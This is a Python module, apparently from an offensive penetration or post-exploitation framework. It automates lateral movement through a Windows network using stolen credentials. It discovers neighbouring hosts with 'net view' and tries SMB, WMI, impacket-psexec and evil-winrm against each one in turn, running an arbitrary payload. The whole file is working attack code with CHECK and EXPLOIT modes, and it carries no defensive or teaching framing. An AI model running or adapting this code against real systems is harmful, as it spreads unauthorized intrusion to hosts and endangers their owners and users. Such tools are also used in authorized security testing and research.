"""Post-Exploitation — Lateral Movement.

Uses extracted credentials to pivot to other hosts in the network
via SMB, WMI, WinRM, or PSExec.
"""

import subprocess
import shutil

NAME = "Lateral Movement"
DESCRIPTION = "Pivot to other hosts using stolen credentials via SMB/WMI/WinRM/PSExec"


def _detect_hosts(target: str, auth: str, cmd_path: str, timeout: int) -> list:
    """Discover live hosts from the compromised machine."""
    hosts = []
    try:
        p = subprocess.run(
            [cmd_path, f"{auth}@{target}", "-q",
             'net view 2>nul | findstr \\\\'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr
        import re
        hosts = re.findall(r"\\\\(\S+)", out)
    except Exception:
        pass
    return hosts


def _try_smb_pivot(host: str, auth: str, cmd_path: str, timeout: int) -> dict:
    """Try SMB lateral movement with current credentials."""
    result = {"host": host, "method": "smb", "success": False, "details": ""}
    try:
        p = subprocess.run(
            [cmd_path, f"{auth}@{host}", "-q", "whoami"],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr
        if "nt authority" in out.lower() or "administrator" in out.lower():
            result["success"] = True
            result["details"] = out.strip()[:200]
    except Exception:
        result["details"] = "Connection failed"
    return result


def _try_wmi_pivot(host: str, auth: str, cmd_path: str, payload: str, timeout: int) -> dict:
    """Try WMI lateral movement."""
    result = {"host": host, "method": "wmi", "success": False, "details": ""}
    try:
        p = subprocess.run(
            [cmd_path, f"{auth}@{host}", "-q",
             f'cmd /c "{payload}"'],
            capture_output=True, text=True, timeout=timeout * 2,
        )
        out = p.stdout + p.stderr
        if out.strip():
            result["success"] = True
            result["details"] = out.strip()[:200]
    except Exception:
        result["details"] = "WMI connection failed"
    return result


def _try_winrm_pivot(host: str, auth: str, payload: str, timeout: int) -> dict:
    """Try WinRM lateral movement."""
    result = {"host": host, "method": "winrm", "success": False, "details": ""}
    try:
        cmd = shutil.which("evil-winrm")
        if not cmd:
            result["details"] = "evil-winrm not found"
            return result

        user, pwd = auth.split(":")[0], auth.split(":")[-1]
        domain = auth.split("/")[0] if "/" in auth else ""

        p = subprocess.run(
            [cmd, "-i", host, "-u", user, "-p", pwd,
             "-c", payload if payload.endswith(".ps1") else ""],
            capture_output=True, text=True, timeout=timeout * 2,
        )
        out = p.stdout + p.stderr
        if out.strip() and "error" not in out.lower()[:50]:
            result["success"] = True
            result["details"] = out.strip()[:200]
    except Exception:
        result["details"] = "WinRM connection failed"
    return result


def _try_psexec_pivot(host: str, auth: str, payload: str, timeout: int) -> dict:
    """Try PSExec lateral movement."""
    result = {"host": host, "method": "psexec", "success": False, "details": ""}
    try:
        cmd = shutil.which("impacket-psexec") or shutil.which("psexec.py")
        if not cmd:
            result["details"] = "impacket-psexec not found"
            return result

        p = subprocess.run(
            [cmd, f"{auth}@{host}", "-c", payload],
            capture_output=True, text=True, timeout=timeout * 2,
        )
        out = p.stdout + p.stderr
        if out.strip():
            result["success"] = True
            result["details"] = out.strip()[:200]
    except Exception:
        result["details"] = "PSExec connection failed"
    return result


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    payload = options.get("PAYLOAD", "cmd.exe /c whoami")
    timeout = int(options.get("TIMEOUT", 15))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")
    target_hosts = options.get("TARGET_HOSTS", "").split(",") if options.get("TARGET_HOSTS") else []

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd:
        result["error"] = "impacket-wmiexec not found"
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    if mode == "CHECK":
        result["success"] = True
        result["data"]["status"] = "Lateral movement methods available"
        result["data"]["methods"] = ["smb", "wmi", "winrm", "psexec"]
        return result

    elif mode == "EXPLOIT":
        try:
            # Discover or use provided hosts
            if not target_hosts or target_hosts == [""]:
                print(f"  [*] Discovering network neighbors...")
                target_hosts = _detect_hosts(rhosts, auth, cmd, timeout)
                print(f"  [+] Found {len(target_hosts)} potential targets")

            pivoted = []
            failed = []

            for host in target_hosts[:10]:  # Limit to 10 hosts
                host = host.strip()
                if not host or host.lower() == rhosts.lower():
                    continue

                print(f"  [*] Trying lateral movement to {host}...")

                # Try methods in order of preference
                for method_func, method_name in [
                    (lambda: _try_smb_pivot(host, auth, cmd, timeout), "smb"),
                    (lambda: _try_wmi_pivot(host, auth, cmd, payload, timeout), "wmi"),
                    (lambda: _try_psexec_pivot(host, auth, payload, timeout), "psexec"),
                    (lambda: _try_winrm_pivot(host, auth, payload, timeout), "winrm"),
                ]:
                    r = method_func()
                    if r["success"]:
                        pivoted.append(r)
                        print(f"  [+] {method_name.upper()} success on {host}: {r['details'][:80]}")
                        break
                else:
                    failed.append(host)

            result["success"] = len(pivoted) > 0
            result["data"]["pivoted_hosts"] = len(pivoted)
            result["data"]["failed_hosts"] = len(failed)
            result["data"]["pivoted"] = pivoted
            result["data"]["failed"] = failed
            result["data"]["status"] = f"Pivoted to {len(pivoted)}/{len(target_hosts)} hosts"

        except Exception as e:
            result["error"] = str(e)

    return result
